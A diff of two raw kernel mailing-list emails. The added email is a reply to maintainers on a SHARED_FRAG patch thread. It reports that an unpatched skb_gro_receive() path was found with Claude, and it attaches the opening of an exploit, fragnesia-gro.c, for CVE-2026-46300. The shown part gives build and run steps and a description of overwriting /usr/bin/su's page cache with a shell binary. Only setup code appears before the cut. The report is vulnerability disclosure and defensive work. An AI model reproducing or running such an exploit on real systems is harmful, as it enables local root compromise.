@@ -1,441 +1,1030 @@
-Return-Path: <netdev+bounces-287828-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-287829-lists+netdev=lfdr.de@vger.kernel.org>
 Delivered-To: lists+netdev@lfdr.de
 Received: from mail.lfdr.de
 	by lfdr with LMTP
-	id uDIBHuVmBWoZWAIAu9opvQ
-	(envelope-from <netdev+bounces-287828-lists+netdev=lfdr.de@vger.kernel.org>)
-	for <lists+netdev@lfdr.de>; Thu, 14 May 2026 08:08:37 +0200
+	id kE75Jy5pBWq5WgIAu9opvQ
+	(envelope-from <netdev+bounces-287829-lists+netdev=lfdr.de@vger.kernel.org>)
+	for <lists+netdev@lfdr.de>; Thu, 14 May 2026 08:18:22 +0200
 X-Original-To: lists+netdev@lfdr.de
-Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
-	by mail.lfdr.de (Postfix) with ESMTPS id 087E153E335
-	for <lists+netdev@lfdr.de>; Thu, 14 May 2026 08:08:36 +0200 (CEST)
+Received: from tor.lore.kernel.org (tor.lore.kernel.org [IPv6:2600:3c04:e001:36c::12fc:5321])
+	by mail.lfdr.de (Postfix) with ESMTPS id 0FFD953E3D0
+	for <lists+netdev@lfdr.de>; Thu, 14 May 2026 08:18:22 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by sea.lore.kernel.org (Postfix) with ESMTP id B0DC230234D2
-	for <lists+netdev@lfdr.de>; Thu, 14 May 2026 06:08:33 +0000 (UTC)
+	by tor.lore.kernel.org (Postfix) with ESMTP id A4979302307D
+	for <lists+netdev@lfdr.de>; Thu, 14 May 2026 06:18:20 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 661203C0602;
-	Thu, 14 May 2026 06:08:31 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id B4BB53932D5;
+	Thu, 14 May 2026 06:18:18 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=meta.com header.i=@meta.com header.b="JrftBeB0"
+	dkim=pass (2048-bit key) header.d=kerneltoast.com header.i=@kerneltoast.com header.b="UZQygzof"
 X-Original-To: netdev@vger.kernel.org
-Received: from mx0b-00082601.pphosted.com (mx0b-00082601.pphosted.com [67.231.153.30])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-dl1-f53.google.com (mail-dl1-f53.google.com [74.125.82.53])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 58C4032E6B8
-	for <netdev@vger.kernel.org>; Thu, 14 May 2026 06:08:29 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=67.231.153.30
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1778738911; cv=fail; b=uEEBW33zF0kgf7fknc0y2Zs+FqKhVmknN/qX63Pdran3uGnBMviUf9GpfR/pKoRbghDE6rawNKGuHUlvMzluT+cJ80LLthlJnp0TvsxP40J0GmxbFWpmENiUK4UW52TJoaAFtZn0ElfqSbwcgukmC0rsOeivAaM7Wyrt8sJj8eI=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1778738911; c=relaxed/simple;
-	bh=e7Kow0xzJq1vBnIAbO87uy56Xrm9JYQWs9C9i1TFxY8=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=YqvckAIRQ/JTFIxvdwfEeEviZrd4QZnBQny/QLswL9Dm6d5kJJTPMynUz0ae3TkMpkfU5zXYLukAAKPlFOcx9fUMrE6JjfMScZBwfJKOg21HnYmx2q4MxbDf/3kjZIE+y+7vVb6hmC24EfnP0jQ480P9SWdlnDggXIi3IfkKVT0=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=meta.com; spf=pass smtp.mailfrom=meta.com; dkim=pass (2048-bit key) header.d=meta.com header.i=@meta.com header.b=JrftBeB0; arc=fail smtp.client-ip=67.231.153.30
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=meta.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=meta.com
-Received: from pps.filterd (m0528005.ppops.net [127.0.0.1])
-	by mx0a-00082601.pphosted.com (8.18.1.11/8.18.1.11) with ESMTP id 64DLi79M1489281
-	for <netdev@vger.kernel.org>; Wed, 13 May 2026 23:08:28 -0700
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=meta.com; h=cc
-	:content-transfer-encoding:content-type:date:from:in-reply-to
-	:message-id:mime-version:references:subject:to; s=s2048-2025-q2;
-	 bh=CUfNd8j6o1cqzuTyhkUx5QHxT8WZBdIbLx1WShVD26M=; b=JrftBeB0hZ1C
-	u9/4pXmowfTiMV+9zaUBxqBHL8hI/vpmgz/fqp2OwHpQGWU5Iv5WJSuD0h/uV0G3
-	nO9ZfCV04i7VMuNq4iC0Z1ED4JixEmry8TU/qbL/XrDe2PsEhuSsIukh+RIEN9bh
-	nV0Poj0YWnuvjK+vLJgr+PTTcO3Zj4DL2Inpyf51owJ38wz0vqrOVeKkoY+rrKs5
-	5Gc2J1ZMzOeyrfN05Sx9NATUuLp043r/g5PF+Cw+RIQu07QEafML7+PihCQi57iq
-	VTgj1pBLClgtpWkay28KW4QTF/U7SrPjIgKrANWPLw5YeiV3nX1HyefMpNbn1f4m
-	XT9x5gQyWQ==
-Received: from mail-ot1-f71.google.com (mail-ot1-f71.google.com [209.85.210.71])
-	by mx0a-00082601.pphosted.com (PPS) with ESMTPS id 4e3nvnna26-1
-	(version=TLSv1.3 cipher=TLS_AES_128_GCM_SHA256 bits=128 verify=NOT)
-	for <netdev@vger.kernel.org>; Wed, 13 May 2026 23:08:28 -0700 (PDT)
-Received: by mail-ot1-f71.google.com with SMTP id 46e09a7af769-7dccbd50e3fso16967268a34.2
-        for <netdev@vger.kernel.org>; Wed, 13 May 2026 23:08:28 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1778738907; cv=none;
-        d=google.com; s=arc-20240605;
-        b=ODj5CrB0s/BF6+8S+geO/VkBeyk1VWAMvkOW46o1MdGnfpJMY0jM3ehD98iGNRxURd
-         nhvbelCd7Dejjuv2sUrVkO1EmCzAdja4MWi2jh6AVeeSB+5Eqvrpn8GVLbJ9xUV/hBNf
-         IsNp7gO284g6X5vC+bjmhfuWTh96BlOdLzNTdqK6MYyOX7o2TO10IljYGc8s3DXMi8xZ
-         f3FZkDBNqwIAXVV+hJuh2RvrvOTwKoMda2L2MhYbVjah46rR8DvII0fX1x/ccDBPSyqk
-         UXG3sFjl3Hyr0g7vBnTnfFAvU90voCC6xPMCifQpALiPYgtWy2uXqHG5XiXFfL8VzL5G
-         otHg==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version;
-        bh=0KylqHwUi+PjJPZEIhBEmMw13oAHMDcoOl6huUe5x/c=;
-        fh=v4+SJBuwKHakiRPMU/Vxbjb/2eB5ENGUo9o5gQBT3kg=;
-        b=Og53W/IITKTeP6/DRmfrVWRt0jpayIpTDHs6s0idnLBfm3ZSMsxVxeFEFy/7jmXLHu
-         8xFltvKOtMuEptUJw4DAkl75m5+w8rHinTiS3raxffwLnrQ7oEnYZU6OvbbPkCJZqsJ1
-         QjHtSank7sRvJYc82rogMpV8BNx5T6dw1BgqvA1JRxG3jrJFf+QhKlWOvJytnlS6zbCf
-         LINC3LH8+DFSOO2xcpch18m7eZIEqLPtgTrDSxTCopUmyNl0AaI4nBCuSYUyYeOoklpS
-         hvsPB9V2lOShXy57XCTR+RWcVMP6Gpp/8SPlWqMJNjdu1kzGdd5RRbW/sQhWVT96TI9i
-         i1KA==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id EE8A3221DB6
+	for <netdev@vger.kernel.org>; Thu, 14 May 2026 06:18:15 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.53
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1778739498; cv=none; b=s/NHt29LoYpB2a+1Ty2UnNOR1YNKISszJ748yE0+OUcVN9Ql8XC2ksjMxM71rV4lOl3iEnoIDodhllGKZo3ArxNjMYwN4wt5lpzYOupM4YA9VEgTyIxrvZ6o+IAbucvaelaRpkgZ4+HKR7pOEWghWJ9U4LlUUkW0PagoYTO8Zcw=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1778739498; c=relaxed/simple;
+	bh=l6JKP26tIyZi6B70w8aRqw7vLBI4xOqroV7DAtcb5Wg=;
+	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
+	 Content-Type:Content-Disposition:In-Reply-To; b=SHhTFQlUJYnmGD1OwdfUHsXPUcZqsVAm0ng595/1HARDlGH+Q+AETaUW6jy8Wslk732QUuXpno2ZzGwrZmqSawtacyNHT2KXmLdWef1akoG5yXvyeCXybdUL5qFSkHWE5XkeiATvLx/GDdNuLryEj49fOruFbx3nj6rgp8gQJmo=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=kerneltoast.com; spf=pass smtp.mailfrom=kerneltoast.com; dkim=pass (2048-bit key) header.d=kerneltoast.com header.i=@kerneltoast.com header.b=UZQygzof; arc=none smtp.client-ip=74.125.82.53
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=kerneltoast.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=kerneltoast.com
+Received: by mail-dl1-f53.google.com with SMTP id a92af1059eb24-1335cb20406so616985c88.0
+        for <netdev@vger.kernel.org>; Wed, 13 May 2026 23:18:15 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=kerneltoast.com; s=google; t=1778739495; x=1779344295; darn=vger.kernel.org;
+        h=in-reply-to:content-disposition:mime-version:references:message-id
+         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
+        bh=LuPFojPlZKfA4MGkbSgDYdscmNzjCa+ys3hBtPQ+3ok=;
+        b=UZQygzofe89q0eVeHiVqtK82+/nwDFg+YSAYVGErfxEG9ZuqnOhzSLrLfc0sELU4YZ
+         GB5wnVSys8vFFP3xd+Jiog0DM5qSYDUWSJUcGecKUWQV1B6670iz+mq1pZ7dTYnNb2Jk
+         rjevGTp7FPerfJW3FCodU5dRe+XeJymdXc4QE3VnWltHbJOX4n6i7iC3O8zS9/KUhYM1
+         DTBjebmIZ+PEUkUSVmG/VOYfEEBLIfU6HAKKLFVDxCoLjDMiIs+ZvYbUyL/XCm6pLXqe
+         4p0kdgn6PW/ufc/uF+alc29RntXzaGf5gIvleEg6c7nnoZzAzvQAWjSY7mXXVqLKXf+g
+         M+JQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1778738907; x=1779343707;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
-         :to:cc:subject:date:message-id:reply-to;
-        bh=0KylqHwUi+PjJPZEIhBEmMw13oAHMDcoOl6huUe5x/c=;
-        b=tUztbOboYl0W40b2gDfE0UU4wxk26LljJx/yR+lAmuHI0oYn5mm/Av3E9sDt0ot2lY
-         RZO8FStLFI/QCGD6hHLlydJiGLRj6lHltw7Y8AarWni6KB5j7sCDLBrThJbXpZ7KcX8J
-         hu44mr+r85JvtwtTFv86cUKxmIq9x4x/eh6mU2vgepNSp2n6rpo5MaHNL1fHKV2/LIi+
-         O3SXNrD7Cgr/v/uO6OWIFyWkud3GDU6ml3YV0W/cbNfYlK0EPnEFfJSha5qdbQnrn3R4
-         eXftGeyLAuwp1vMA0fCmgEsRKZsB6sngh6noW3tuXKw4+WIOXtIdAmmbLUBy5OPN8Njs
-         H1qQ==
-X-Forwarded-Encrypted: i=1; AFNElJ9QN3mc6D7cXo2MLqpqV6bDIOVMW4G6DV2EbI9hT2GLTHobdmkKc1PqXWKMYrE9aW6Fpa41pjc=@vger.kernel.org
-X-Gm-Message-State: AOJu0YzdZyK/g9wGJuoy+xJcF1OWlsmFrqL9aEs3GkA0dc5MIJ//w91R
-	I+FN83K5l2Dr7clsfAw3gcW9VfySzrB/N9Idw2TtkloNO88yQ+gsBJXQJL6IoD9CCmsEBmME72M
-	07F++S24K3aG0WjKNvgPrMxOYcKmLiNhUZvU5wTebGAcPIp6iOPy/cKIgXZLYGlu88OwOAt9qLe
-	pgeghTQVh1LsnVybf5AnUkIJSwf/SQkow=
-X-Gm-Gg: Acq92OFYFIVhhrJf6jZ5xZM5Owk6buY9EGsGGSn7E/Y7hEXuWZf5A6uIYu8kSpaYE0b
-	awyjg9IFlPa90IFQeUXFGQECG1e8rxU8q3AEULV/JQWRfc/nU14Cqbi62hsH84jztPBPUHhE+IM
-	gJAl3uOuyxAEc+gO3nIJS5ChgOQfRVpJH9WSWzwK9ga+iW6Zeo4FQTNzl4hFtmJQQIe3/7az66V
-	dwyBNsRiUe8nRcl6QngsKkf/DPUbU+jB94Q4A07
-X-Received: by 2002:a05:6830:608a:b0:7dc:c301:d0b7 with SMTP id 46e09a7af769-7e3dcb27e85mr3708445a34.28.1778738907360;
-        Wed, 13 May 2026 23:08:27 -0700 (PDT)
-X-Received: by 2002:a05:6830:608a:b0:7dc:c301:d0b7 with SMTP id
- 46e09a7af769-7e3dcb27e85mr3708421a34.28.1778738906835; Wed, 13 May 2026
- 23:08:26 -0700 (PDT)
+        d=1e100.net; s=20251104; t=1778739495; x=1779344295;
+        h=in-reply-to:content-disposition:mime-version:references:message-id
+         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
+         :subject:date:message-id:reply-to;
+        bh=LuPFojPlZKfA4MGkbSgDYdscmNzjCa+ys3hBtPQ+3ok=;
+        b=AL8K+9PiuWY3pBAwX3h59XwOf9TqsTWVRFezZDmiesEpMQWqt37Wg61wGQns4/KjTu
+         3QiKti0W1cHBYisqKVUWuYxJaYIP0ovxiX8vaqNgUI1G7DjTxrL8rmmAHPBIcqdfZN7M
+         bWvE7XE5jJPjhXMOf2P6MCw03cpXANIfHC6isONpuJLGC7ISiLjZMKugBx/wDthZ7nro
+         HOa1vUGtuNrQHq69CQuTuMOnohM3SuOS9AGtztRfwa2RxhoFeOJyy7C1Dx7ZzJQkgJ7i
+         Q9ogoi5kq0EEgO7IjvJck40JE7yf6rT5puZJgyAPaPXYLobBMyMvZfSaAgxrGoySIr0U
+         WEIA==
+X-Forwarded-Encrypted: i=1; AFNElJ9NAbIHE6JPhhaTXpM7dY8EiTPE6rXBWehwQteU9htu7rhEq0QTMUedNDNCVgwUsMKMmugqA98=@vger.kernel.org
+X-Gm-Message-State: AOJu0YzYZ8ExcLN7iIaLehirbdYiJ99jCVwrCM6Sn5ItG5GuUsFnyHWa
+	VlCEeWiCwljhG1wLHKf3ESCjP9dIGAHGElB6ujQlZNQdYZpP2aEaMaCkbAM6qMAMAuAM
+X-Gm-Gg: Acq92OHj82Gs2hsUCEFa02zLPSRFDG4vafnZmWLcuHEBGg4UXItXDWm4b4fG5HT8MX+
+	BxAL8X9tu8y04cTo/S+932DcEvQzUzXtsacjNqXtFoXbWmCxbAX/eE7Wjohyzmy7UBCkiXLQ4LS
+	6ltt0G73AZ5g14C/7m0Ht4toHKdF722fpT/5cO6U8oiyZBb/nXWFA6t1Z8zaFAJxwsWbIx6Ty99
+	XuXoXmTq9hFPgj9F1TiItGYHlSdFWBwtx+NvPRAz1vvN0QPoAhiT6Kszat8T5tI24Yd63nNHJ/Y
+	RemzjswhvmDaeyah2bAoRc6DlvtpjHvBwB7+H4exBCe1PLBdx4LAwsANYGoQyza15akjWn5ong1
+	u3yZizo0YmAi0P3rjLj/Aah5vsL8hXOOooL2XVizdSbl1TpO7p+im0zV3lGy/8yoCbdIgAwymoQ
+	EwSlqlRBckcCOz7AQHe6bitddQFkfovOFWw9r7wRoyw6HqVH0=
+X-Received: by 2002:a05:7022:527:b0:11b:f056:a19b with SMTP id a92af1059eb24-1343668297emr4598190c88.18.1778739494761;
+        Wed, 13 May 2026 23:18:14 -0700 (PDT)
+Received: from sultan-box ([142.147.89.218])
+        by smtp.gmail.com with ESMTPSA id a92af1059eb24-134cc2351c3sm2851040c88.11.2026.05.13.23.18.12
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Wed, 13 May 2026 23:18:13 -0700 (PDT)
+Date: Wed, 13 May 2026 23:18:10 -0700
+From: Sultan Alsawaf <sultan@kerneltoast.com>
+To: Hyunwoo Kim <imv4bel@gmail.com>
+Cc: davem@davemloft.net, edumazet@google.com, kuba@kernel.org,
+	pabeni@redhat.com, horms@kernel.org, kerneljasonxing@gmail.com,
+	kuniyu@google.com, mhal@rbox.co, jiayuan.chen@linux.dev,
+	steffen.klassert@secunet.com, vakzz@zellic.io, ben@decadent.org.uk,
+	herbert@gondor.apana.org.au, dsahern@kernel.org,
+	netdev@vger.kernel.org, stable@vger.kernel.org
+Subject: Re: [PATCH net v2] net: skbuff: propagate shared-frag marker through
+ frag-transfer helpers
+Message-ID: <agVpIsaSherjHTYg@sultan-box>
+References: <agToIEDI4TaTNLRb@v4bel>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <20260512184755.4137227-1-zhipingz@meta.com> <20260512184755.4137227-2-zhipingz@meta.com>
- <e6928a10-77b1-4fdf-8bc3-cd0154b4d4c5@huawei.com>
-In-Reply-To: <e6928a10-77b1-4fdf-8bc3-cd0154b4d4c5@huawei.com>
-From: Zhiping Zhang <zhipingz@meta.com>
-Date: Wed, 13 May 2026 23:08:16 -0700
-X-Gm-Features: AVHnY4Lk7AsZ1k9gNnGjrk1ylBU7xPjARj3UiyZ3EAOpFnNYqojJiXoPPS0-GYY
-Message-ID: <CAH3zFs2W5cB5Jhk8pm9K=O3-DyN3tHm7h5q9Hu26ekV=_gBEvw@mail.gmail.com>
-Subject: Re: [PATCH v3 1/2] vfio: add dma-buf get_tph callback and DMA_BUF_TPH feature
-To: fengchengwen <fengchengwen@huawei.com>
-Cc: Alex Williamson <alex@shazbot.org>, Jason Gunthorpe <jgg@ziepe.ca>,
-        Leon Romanovsky <leon@kernel.org>, Bjorn Helgaas <helgaas@kernel.org>,
-        kvm@vger.kernel.org, linux-rdma@vger.kernel.org,
-        linux-pci@vger.kernel.org, netdev@vger.kernel.org,
-        dri-devel@lists.freedesktop.org, Keith Busch <kbusch@kernel.org>,
-        Yochai Cohen <yochai@nvidia.com>, Yishai Hadas <yishaih@nvidia.com>
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
-X-Proofpoint-GUID: ExrDDD_bjpLWvXtaQSQdX47YG_kH2eHU
-X-Proofpoint-ORIG-GUID: ExrDDD_bjpLWvXtaQSQdX47YG_kH2eHU
-X-Authority-Analysis: v=2.4 cv=b/eCJNGx c=1 sm=1 tr=0 ts=6a0566dc cx=c_pps
- a=OI0sxtj7PyCX9F1bxD/puw==:117 a=IkcTkHD0fZMA:10 a=NGcC8JguVDcA:10
- a=VkNPw1HP01LnGYTKEx00:22 a=7x6HtfJdh03M6CCDgxCd:22 a=jCddH8ec0KUNCymVuxII:22
- a=i0EeH86SAAAA:8 a=VabnemYjAAAA:8 a=eh8E65cc9O_vH5X4jusA:9 a=QEXdDO2ut3YA:10
- a=Z1Yy7GAxqfX1iEi80vsk:22 a=gKebqoRLp9LExxC7YDUY:22
-X-Proofpoint-Spam-Details-Enc: AW1haW4tMjYwNTE0MDA1OCBTYWx0ZWRfX2lngrY0ZU4Ae
- KEiRp5qtk6C8Ac12cWags+UnCFWcqFZrwwZkStWnNeQRvWW0X5xMKlIdhR4bE5hZh+bsTX6x79G
- LzOtxR9wLW+B5j9VE8erarzuAOZsqNjqRUyuUP4gJAHdH5q6a43A3f88JrLNhEQc1kSWu6NTc5t
- 4PFVDdEjUjh5DTUi9PNjofIep++UEPuONutCR9A5JBqmP0cduB5TQ4zZPbBAjrEpxr+2uam64AG
- +m6roIdfB/2ksUoglDHd3csRD/zvf2NJQbTJFAqci8DYgegqEcRVBKXvVyaP3tATnZ4Xd+IapcW
- 20iiJO1RPJPCfglX5woQXnnZff814By5uk8bwg35TeC0Ak9LX8GT2j2h6/YiA8bJ/U+gRczYL+z
- ouwWKvR0Yusx7FZPN3dGeYCeZX0FeNI7rECPkWmnsE2Qq7vyRs8pNYUDMmbOY1VeIPITsE6d7MI
- posuCrvJpguFs9+Nmuw==
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1143,Hydra:6.1.51,FMLib:17.12.100.49
- definitions=2026-05-14_01,2026-05-13_01,2025-10-01_01
-X-Rspamd-Queue-Id: 087E153E335
+Content-Type: multipart/mixed; boundary="c6LM3/lR/jigV3Rc"
+Content-Disposition: inline
+In-Reply-To: <agToIEDI4TaTNLRb@v4bel>
+X-Rspamd-Queue-Id: 0FFD953E3D0
 X-Rspamd-Server: lfdr
-X-Spamd-Result: default: False [-0.16 / 15.00];
-	ARC_REJECT(1.00)[cv is fail on i=2];
-	DMARC_POLICY_ALLOW(-0.50)[meta.com,reject];
-	R_DKIM_ALLOW(-0.20)[meta.com:s=s2048-2025-q2];
-	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10:c];
+X-Spamd-Result: default: False [-1.66 / 15.00];
+	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
+	MID_RHS_NOT_FQDN(0.50)[];
+	DMARC_POLICY_ALLOW(-0.50)[kerneltoast.com,reject];
+	R_DKIM_ALLOW(-0.20)[kerneltoast.com:s=google];
+	R_SPF_ALLOW(-0.20)[+ip6:2600:3c04:e001:36c::/64:c];
 	MAILLIST(-0.15)[generic];
-	MIME_GOOD(-0.10)[text/plain];
+	MIME_GOOD(-0.10)[multipart/mixed,text/plain];
 	HAS_LIST_UNSUB(-0.01)[];
-	TAGGED_FROM(0.00)[bounces-287828-lists,netdev=lfdr.de];
 	RCVD_TLS_LAST(0.00)[];
+	TAGGED_FROM(0.00)[bounces-287829-lists,netdev=lfdr.de];
 	FROM_HAS_DN(0.00)[];
-	MIME_TRACE(0.00)[0:+];
+	FREEMAIL_TO(0.00)[gmail.com];
+	RCPT_COUNT_TWELVE(0.00)[17];
+	FREEMAIL_CC(0.00)[davemloft.net,google.com,kernel.org,redhat.com,gmail.com,rbox.co,linux.dev,secunet.com,zellic.io,decadent.org.uk,gondor.apana.org.au,vger.kernel.org];
+	MIME_TRACE(0.00)[0:+,1:+,2:+,3:+];
 	FORGED_SENDER_MAILLIST(0.00)[];
-	RCPT_COUNT_TWELVE(0.00)[13];
-	DKIM_TRACE(0.00)[meta.com:+];
-	MISSING_XM_UA(0.00)[];
-	TO_DN_SOME(0.00)[];
-	PRECEDENCE_BULK(0.00)[];
-	FROM_NEQ_ENVFROM(0.00)[zhipingz@meta.com,netdev@vger.kernel.org];
+	HAS_ATTACHMENT(0.00)[];
 	FORGED_RECIPIENTS_MAILLIST(0.00)[];
-	RCVD_COUNT_FIVE(0.00)[6];
-	TAGGED_RCPT(0.00)[netdev];
+	TO_DN_SOME(0.00)[];
+	RCVD_COUNT_FIVE(0.00)[5];
+	PRECEDENCE_BULK(0.00)[];
+	FROM_NEQ_ENVFROM(0.00)[sultan@kerneltoast.com,netdev@vger.kernel.org];
+	DKIM_TRACE(0.00)[kerneltoast.com:+];
 	NEURAL_HAM(-0.00)[-1.000];
-	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
-	DBL_BLOCKED_OPENRESOLVER(0.00)[mail.gmail.com:mid,huawei.com:email]
+	RCVD_VIA_SMTP_AUTH(0.00)[];
+	TAGGED_RCPT(0.00)[netdev];
+	MISSING_XM_UA(0.00)[];
+	ASN(0.00)[asn:63949, ipnet:2600:3c04::/32, country:SG];
+	DBL_BLOCKED_OPENRESOLVER(0.00)[tor.lore.kernel.org:helo,tor.lore.kernel.org:rdns,anthropic.com:email]
 X-Rspamd-Action: no action
 
-On Tue, May 12, 2026 at 6:33=E2=80=AFPM fengchengwen <fengchengwen@huawei.c=
-om> wrote:
->
-> >
-> Hi Zhiping,
->
-> I have several suggestions:
->
-> 1. In struct vfio_device_feature_dma_buf_tph, steering_tag is defined as
->    __u16, but PCIe TPH base steering tag is only 8-bit. We can use __u8
->    for steering_tag to shrink structure size and reduce reserved padding.
->
-> 2. The flags field seems unnecessary. We can use value 0 of steering_tag
->    or steering_tag_ext to indicate the corresponding ST entry is not
->    available, which simplifies the uAPI design.
->
-> 3. All TPH metadata fields (st, ext st, ph) fit within 32 bits. We can
->    wrap them into a union with atomic_t, then use atomic read/write
->    instead of memory_lock plus smp_load_acquire/smp_store_release. This
->    makes lockless access cleaner and avoids ordering maintenance.
->
-> For details, see the text.
->
 
-  Hi Feng,
+--c6LM3/lR/jigV3Rc
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
 
-  Thanks for the detailed review.
+On Thu, May 14, 2026 at 06:07:44AM +0900, Hyunwoo Kim wrote:
+> Changes in v2:
+> - Also propagate SHARED_FRAG in skb_shift()
+> - v1: https://lore.kernel.org/all/agRfuVOeMI5pbHhY@v4bel/
 
-  1) Regular TPH uses an 8-bit ST, while Extended TPH uses a 16-bit ST, so
-  so Extended TPH in Flit mode TLP can carry a 16-bit steering tag in
-the request.
+Hi Hyunwoo,
 
-  2) I still think I need an explicit validity indication rather than using
-  `0` to mean "not present". ST and Extended ST can coexist with
-  different values (including the value 0).
+I've been working on mitigating this vulnerability as a member of the kernel
+team at CIQ, a distro vendor. In particular, we wanted to make sure that there
+weren't any lingering places missing SHARED_FRAG propagation.
 
-   3) I also do not think packing the fields into `atomic_t` removes the ne=
-ed
-  for `memory_lock` here, because the write side still needs the lock for
-  `priv->vdev` ownership/lifetime checks and the dma-buf list/cleanup
-  paths. Open for discussion, though.
+To that end, I used Claude to discover that skb_gro_receive() remained unpatched
+(as you pointed out in the v1 thread). And then I generated a PoC exploiting the
+vulnerable skb_gro_receive() path.
 
-  Thanks,
-  Zhiping
+The PoC is a modified version of the original fragnesia PoC. It works 100% of
+the time, just like the original fragnesia PoC.
+
+I have attached the PoC and a patch that fixes skb_gro_receive(). Please take a
+look at them.
+
+Thanks,
+Sultan
+
+--c6LM3/lR/jigV3Rc
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: attachment; filename=fragnesia-gro.c
+
+/*
+ * fragnesia-gro.c: skb_gro_receive() SKBFL_SHARED_FRAG page-cache corruption PoC
+ *
+ * Drop-in replacement for the espintcp fragnesia variant, targeting the same
+ * bug class (CVE-2026-46300) through the GRO frag-merge path instead of the
+ * espintcp path. Copies shell_elf over /usr/bin/su's page cache the same way
+ * the original fragnesia does.
+ *
+ * The exploit splices 17 bytes per round (1 byte ciphertext + 16 byte ICV) so
+ * each ESP decrypt corrupts exactly ONE target byte with no collateral damage.
+ * A precomputed IV table selects the AES-GCM keystream byte that XORs the
+ * current file content to the desired shell_elf byte.
+ *
+ * Based on the Fragnesia PoC by William Bowling / Hyunwoo Kim.
+ *
+ * Build:
+ *   gcc -O2 -Wall -Wextra -static fragnesia-gro.c -o fragnesia-gro
+ *
+ * Run (as root):
+ *   ./fragnesia-gro
+ *
+ * Exit codes:
+ *   1: vulnerable (page cache mutated through GRO flag-strip path)
+ *   0: fixed (byte unchanged)
+ *   2: local setup or argument error
+ *   4: namespace/veth gate closed
+ */
+
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <limits.h>
+#include <net/if.h>
+#include <netinet/in.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mount.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <time.h>
+#include <sys/wait.h>
+#include <unistd.h>
+#include <linux/bpf.h>
+#include <linux/if_addr.h>
+#include <linux/if_alg.h>
+#include <linux/netlink.h>
+#include <linux/xfrm.h>
+
+/* ---- compat defines ---- */
+
+#ifndef NLA_ALIGNTO
+#define NLA_ALIGNTO 4
+#endif
+#define NLA_ALIGN(len)  (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
+#ifndef NLA_HDRLEN
+#define NLA_HDRLEN      ((int)NLA_ALIGN(sizeof(struct nlattr)))
+#endif
+#ifndef RTM_NEWLINK
+#define RTM_NEWLINK 16
+#endif
+#ifndef RTM_NEWADDR
+#define RTM_NEWADDR 20
+#endif
+#ifndef NETLINK_ROUTE
+#define NETLINK_ROUTE 0
+#endif
